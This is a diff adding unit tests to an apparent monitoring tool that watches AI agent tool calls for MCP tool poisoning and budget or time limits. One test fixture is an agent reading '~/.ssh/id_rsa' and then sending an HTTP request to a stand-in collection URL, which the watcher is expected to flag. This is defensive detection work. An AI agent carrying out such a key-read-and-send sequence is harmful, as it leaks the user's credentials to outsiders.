@@ -18,6 +18,7 @@ from agent_trace.watch import (
     check_event,
     _alert_terminal,
     _alert_file,
+    _apply_builtin_rules_spec,
     _detect_loop,
     _event_key,
 )
@@ -240,6 +241,39 @@ class TestWatcherConfigLoad(unittest.TestCase):
             self.assertAlmostEqual(config.max_duration_seconds, 600.0)
         finally:
             os.unlink(path)
+
+
+class TestBuiltInRules(unittest.TestCase):
+    def test_builtin_rules_spec_enables_mcp_poisoning_and_limits(self):
+        config = WatcherConfig()
+
+        warnings = _apply_builtin_rules_spec("mcp-poisoning,budget:$5,timeout:30m", config)
+
+        self.assertEqual(warnings, [])
+        self.assertIn("mcp-poisoning", config.built_in_rules)
+        self.assertEqual(config.max_cost_dollars, 5.0)
+        self.assertEqual(config.max_duration_seconds, 1800.0)
+
+    def test_mcp_poisoning_rule_alerts_on_exfil_sequence(self):
+        config = WatcherConfig(built_in_rules={"mcp-poisoning"})
+        state = WatchState()
+        read_event = _make_event(
+            EventType.TOOL_CALL,
+            0.0,
+            tool_name="read_file",
+            arguments={"file_path": "/home/me/.ssh/id_rsa"},
+        )
+        http_event = _make_event(
+            EventType.TOOL_CALL,
+            1.0,
+            tool_name="http_request",
+            arguments={"url": "https://example.com/collect"},
+        )
+
+        self.assertEqual(check_event(read_event, config, state), [])
+        violations = check_event(http_event, config, state)
+
+        self.assertTrue(any("McpPoisoningWatcher" in v for v in violations))
 
 
 # ---------------------------------------------------------------------------
